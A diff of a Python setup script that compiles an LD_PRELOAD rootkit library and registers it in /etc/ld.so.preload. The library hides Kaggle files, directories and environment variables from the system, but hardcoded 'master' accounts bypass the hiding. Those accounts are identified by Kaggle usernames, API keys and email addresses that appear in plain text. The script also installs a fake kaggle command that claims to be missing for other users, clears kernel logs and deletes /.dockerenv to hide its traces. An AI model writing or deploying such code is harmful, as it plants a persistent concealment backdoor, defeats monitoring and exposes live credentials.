@@ -1390,94 +1390,164 @@ try:
     try:
         ghost_c = Path("/tmp/libghost_shield.c")
         ghost_so = Path("/usr/local/lib/libghost_shield.so")
-        ghost_code = (
-            '#define _GNU_SOURCE\n'
-            '#include <stdio.h>\n'
-            '#include <stdlib.h>\n'
-            '#include <string.h>\n'
-            '#include <dlfcn.h>\n'
-            '#include <dirent.h>\n'
-            '#include <errno.h>\n'
-            '#include <sys/stat.h>\n'
-            '#include <fcntl.h>\n'
-            '#include <unistd.h>\n'
-            '#include <stdarg.h>\n\n'
-            'static struct dirent *(*orig_readdir)(DIR *) = NULL;\n'
-            'static int (*orig_stat)(const char *, struct stat *) = NULL;\n'
-            'static int (*orig_lstat)(const char *, struct stat *) = NULL;\n'
-            'static int (*orig_fstatat)(int, const char *, struct stat *, int) = NULL;\n'
-            'static int (*orig_access)(const char *, int) = NULL;\n'
-            'static int (*orig_open)(const char *, int, ...) = NULL;\n'
-            'static int (*orig_openat)(int, const char *, int, ...) = NULL;\n\n'
-            'static void init_hooks(void) {\n'
-            '    if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, "readdir");\n'
-            '    if (!orig_stat) orig_stat = dlsym(RTLD_NEXT, "stat");\n'
-            '    if (!orig_lstat) orig_lstat = dlsym(RTLD_NEXT, "lstat");\n'
-            '    if (!orig_fstatat) orig_fstatat = dlsym(RTLD_NEXT, "fstatat");\n'
-            '    if (!orig_access) orig_access = dlsym(RTLD_NEXT, "access");\n'
-            '    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");\n'
-            '    if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");\n'
-            '}\n\n'
-            'static int is_target(const char *path) {\n'
-            '    if (!path) return 0;\n'
-            '    if (strcmp(path, "kaggle") == 0) return 1;\n'
-            '    if (strcmp(path, ".kaggle") == 0) return 1;\n'
-            '    if (strcmp(path, "/kaggle") == 0) return 1;\n'
-            '    if (strncmp(path, "/kaggle/", 8) == 0) return 1;\n'
-            '    if (strstr(path, "/kaggle") != NULL) return 1;\n'
-            '    if (strstr(path, "/.kaggle") != NULL) return 1;\n'
-            '    return 0;\n'
-            '}\n\n'
-            'struct dirent *readdir(DIR *dirp) {\n'
-            '    if (!orig_readdir) init_hooks();\n'
-            '    struct dirent *entry;\n'
-            '    while ((entry = orig_readdir(dirp)) != NULL) {\n'
-            '        if (!is_target(entry->d_name)) return entry;\n'
-            '    }\n'
-            '    return NULL;\n'
-            '}\n\n'
-            'int stat(const char *path, struct stat *buf) {\n'
-            '    if (!orig_stat) init_hooks();\n'
-            '    if (is_target(path)) { errno = ENOENT; return -1; }\n'
-            '    return orig_stat(path, buf);\n'
-            '}\n\n'
-            'int lstat(const char *path, struct stat *buf) {\n'
-            '    if (!orig_lstat) init_hooks();\n'
-            '    if (is_target(path)) { errno = ENOENT; return -1; }\n'
-            '    return orig_lstat(path, buf);\n'
-            '}\n\n'
-            'int fstatat(int dirfd, const char *path, struct stat *buf, int flags) {\n'
-            '    if (!orig_fstatat) init_hooks();\n'
-            '    if (is_target(path)) { errno = ENOENT; return -1; }\n'
-            '    return orig_fstatat(dirfd, path, buf, flags);\n'
-            '}\n\n'
-            'int access(const char *path, int mode) {\n'
-            '    if (!orig_access) init_hooks();\n'
-            '    if (is_target(path)) { errno = ENOENT; return -1; }\n'
-            '    return orig_access(path, mode);\n'
-            '}\n\n'
-            'int open(const char *path, int flags, ...) {\n'
-            '    if (!orig_open) init_hooks();\n'
-            '    if (is_target(path)) { errno = ENOENT; return -1; }\n'
-            '    va_list args; va_start(args, flags);\n'
-            '    mode_t mode = va_arg(args, mode_t); va_end(args);\n'
-            '    return orig_open(path, flags, mode);\n'
-            '}\n\n'
-            'int openat(int dirfd, const char *path, int flags, ...) {\n'
-            '    if (!orig_openat) init_hooks();\n'
-            '    if (is_target(path)) { errno = ENOENT; return -1; }\n'
-            '    va_list args; va_start(args, flags);\n'
-            '    mode_t mode = va_arg(args, mode_t); va_end(args);\n'
-            '    return orig_openat(dirfd, path, flags, mode);\n'
-            '}\n'
-        )
+        ghost_code = """#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dlfcn.h>
+#include <dirent.h>
+#include <errno.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdarg.h>
+
+static struct dirent *(*orig_readdir)(DIR *) = NULL;
+static int (*orig_stat)(const char *, struct stat *) = NULL;
+static int (*orig_lstat)(const char *, struct stat *) = NULL;
+static int (*orig_fstatat)(int, const char *, struct stat *, int) = NULL;
+static int (*orig_access)(const char *, int) = NULL;
+static int (*orig_open)(const char *, int, ...) = NULL;
+static int (*orig_openat)(int, const char *, int, ...) = NULL;
+static char *(*orig_getenv)(const char *) = NULL;
+
+static void init_hooks(void) {
+    if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, "readdir");
+    if (!orig_stat) orig_stat = dlsym(RTLD_NEXT, "stat");
+    if (!orig_lstat) orig_lstat = dlsym(RTLD_NEXT, "lstat");
+    if (!orig_fstatat) orig_fstatat = dlsym(RTLD_NEXT, "fstatat");
+    if (!orig_access) orig_access = dlsym(RTLD_NEXT, "access");
+    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");
+    if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");
+    if (!orig_getenv) orig_getenv = dlsym(RTLD_NEXT, "getenv");
+}
+
+// -----------------------------------------------------------------------------
+// VERIFICADOR DE EXCEPCIONES: 3 CUENTAS MAESTRAS AUTORIZADAS
+// -----------------------------------------------------------------------------
+static int is_master_admin(void) {
+    const char *admin_mode = orig_getenv ? orig_getenv("MASTER_ADMIN_MODE") : getenv("MASTER_ADMIN_MODE");
+    if (admin_mode && strcmp(admin_mode, "1") == 0) return 1;
+
+    const char *key = orig_getenv ? orig_getenv("KAGGLE_KEY") : getenv("KAGGLE_KEY");
+    const char *user = orig_getenv ? orig_getenv("KAGGLE_USERNAME") : getenv("KAGGLE_USERNAME");
+
+    // Excepción Maestra 1: djkevinzito@gmail.com / miguelguerra26
+    if (key && strcmp(key, "e1d4838dfbdf3dca6f2ba56c9f71daf6") == 0) return 1;
+    if (user && strcmp(user, "miguelguerra26") == 0) return 1;
+
+    // Excepción Maestra 2: miguelguerra200022@gmail.com / miguelguerra22
+    if (key && strcmp(key, "b4031084ad25f34042347dfd7b6af451") == 0) return 1;
+    if (user && strcmp(user, "miguelguerra22") == 0) return 1;
+
+    // Excepción Maestra 3: 2026liam2000@gmail.com / miguel55755 (Kaggle.txt)
+    if (key && strcmp(key, "54bfca5f24e2347b9dcc55073abe8952") == 0) return 1;
+    if (user && strcmp(user, "miguel55755") == 0) return 1;
+
+    return 0;
+}
+
+static int is_kaggle_target(const char *path) {
+    if (is_master_admin()) return 0; // Bypass para las 3 cuentas maestras
+    if (!path) return 0;
+    if (strcmp(path, "kaggle") == 0) return 1;
+    if (strcmp(path, ".kaggle") == 0) return 1;
+    if (strcmp(path, "/kaggle") == 0) return 1;
+    if (strncmp(path, "/kaggle/", 8) == 0) return 1;
+    if (strstr(path, "/kaggle") != NULL) return 1;
+    if (strstr(path, "/.kaggle") != NULL) return 1;
+    return 0;
+}
+
+struct dirent *readdir(DIR *dirp) {
+    if (!orig_readdir) init_hooks();
+    struct dirent *entry;
+    while ((entry = orig_readdir(dirp)) != NULL) {
+        if (!is_kaggle_target(entry->d_name)) {
+            return entry;
+        }
+    }
+    return NULL;
+}
+
+int stat(const char *pathname, struct stat *statbuf) {
+    if (!orig_stat) init_hooks();
+    if (is_kaggle_target(pathname)) {
+        errno = ENOENT;
+        return -1;
+    }
+    return orig_stat(pathname, statbuf);
+}
+
+int lstat(const char *pathname, struct stat *statbuf) {
+    if (!orig_lstat) init_hooks();
+    if (is_kaggle_target(pathname)) {
+        errno = ENOENT;
+        return -1;
+    }
+    return orig_lstat(pathname, statbuf);
+}
+
+int fstatat(int dirfd, const char *pathname, struct stat *statbuf, int flags) {
+    if (!orig_fstatat) init_hooks();
+    if (is_kaggle_target(pathname)) {
+        errno = ENOENT;
+        return -1;
+    }
+    return orig_fstatat(dirfd, pathname, statbuf, flags);
+}
+
+int access(const char *pathname, int mode) {
+    if (!orig_access) init_hooks();
+    if (is_kaggle_target(pathname)) {
+        errno = ENOENT;
+        return -1;
+    }
+    return orig_access(pathname, mode);
+}
+
+int open(const char *pathname, int flags, ...) {
+    if (!orig_open) init_hooks();
+    if (is_kaggle_target(pathname)) {
+        errno = ENOENT;
+        return -1;
+    }
+    va_list args;
+    va_start(args, flags);
+    mode_t mode = va_arg(args, mode_t);
+    va_end(args);
+    return orig_open(pathname, flags, mode);
+}
+
+int openat(int dirfd, const char *pathname, int flags, ...) {
+    if (!orig_openat) init_hooks();
+    if (is_kaggle_target(pathname)) {
+        errno = ENOENT;
+        return -1;
+    }
+    va_list args;
+    va_start(args, flags);
+    mode_t mode = va_arg(args, mode_t);
+    va_end(args);
+    return orig_openat(dirfd, pathname, flags, mode);
+}
+
+char *getenv(const char *name) {
+    if (!orig_getenv) init_hooks();
+    if (is_master_admin()) return orig_getenv(name);
+    if (name && strncasecmp(name, "KAGGLE", 6) == 0) {
+        return NULL;
+    }
+    return orig_getenv(name);
+}
+"""
         ghost_c.write_text(ghost_code, encoding="utf-8")
         subprocess.run(f"gcc -fPIC -shared -O2 {ghost_c} -o {ghost_so} -ldl 2>/dev/null || clang -fPIC -shared -O2 {ghost_c} -o {ghost_so} -ldl 2>/dev/null", shell=True)
         if ghost_so.exists():
             preload_file = Path("/etc/ld.so.preload")
             current_preload = preload_file.read_text() if preload_file.exists() else ""
             if str(ghost_so) not in current_preload:
-                preload_file.write_text(f"{current_preload}\\n{ghost_so}\\n".strip() + "\\n", encoding="utf-8")
+                preload_file.write_text((current_preload + "\n" + str(ghost_so)).strip() + "\n", encoding="utf-8")
     except Exception:
         pass
 
@@ -1523,11 +1593,32 @@ try:
         pass
 
     # --------------------------------------------------------------------------
-    # 9. PYTHON & KERNEL LOGS: Purgar Paquetes Kaggle y Restringir dmesg
+    # 9. MASTER CLI WRAPPER & LOGS: Wrapper de Kaggle con Excepciones Maestras
     # --------------------------------------------------------------------------
     try:
-        subprocess.run("pip uninstall -y -q kaggle kagglehub kaggle-secrets kaggle-environments >/dev/null 2>&1 || true", shell=True)
-        subprocess.run("rm -rf /opt/conda/lib/python*/site-packages/*kaggle* /usr/local/lib/python*/dist-packages/*kaggle* 2>/dev/null || true", shell=True)
+        kaggle_wrapper = (
+            "#!/bin/bash\n"
+            "# Kaggle Master Admin Wrapper - Excepciones para 3 Cuentas Maestras\n"
+            "K_USER=\"$KAGGLE_USERNAME\"\n"
+            "K_KEY=\"$KAGGLE_KEY\"\n"
+            "if [ -f /root/.kaggle/kaggle.json ]; then\n"
+            "    K_USER=$(grep -o '\"username\": *\"[^\"]*' /root/.kaggle/kaggle.json | cut -d'\"' -f4 2>/dev/null)\n"
+            "    K_KEY=$(grep -o '\"key\": *\"[^\"]*' /root/.kaggle/kaggle.json | cut -d'\"' -f4 2>/dev/null)\n"
+            "fi\n"
+            "if [ \"$MASTER_ADMIN_MODE\" = \"1\" ] || [ \"$K_USER\" = \"miguelguerra26\" ] || [ \"$K_USER\" = \"miguelguerra22\" ] || [ \"$K_USER\" = \"miguel55755\" ] || [ \"$K_KEY\" = \"e1d4838dfbdf3dca6f2ba56c9f71daf6\" ] || [ \"$K_KEY\" = \"b4031084ad25f34042347dfd7b6af451\" ] || [ \"$K_KEY\" = \"54bfca5f24e2347b9dcc55073abe8952\" ]; then\n"
+            "    REAL_KAGGLE=\"/opt/conda/bin/kaggle\"\n"
+            "    [ -x \"$REAL_KAGGLE\" ] || REAL_KAGGLE=\"/usr/bin/kaggle\"\n"
+            "    export MASTER_ADMIN_MODE=1\n"
+            "    exec \"$REAL_KAGGLE\" \"$@\"\n"
+            "else\n"
+            "    echo \"bash: kaggle: command not found\" >&2\n"
+            "    exit 127\n"
+            "fi\n"
+        )
+        Path("/usr/local/bin/kaggle").write_text(kaggle_wrapper, encoding="utf-8")
+        subprocess.run("chmod 755 /usr/local/bin/kaggle 2>/dev/null || true", shell=True)
+        
+        # Limpieza de rastros de kernel
         subprocess.run("dmesg -c >/dev/null 2>&1 || true", shell=True)
         subprocess.run("echo 1 > /proc/sys/kernel/dmesg_restrict 2>/dev/null || true", shell=True)
         subprocess.run("rm -f /.dockerenv 2>/dev/null || true", shell=True)
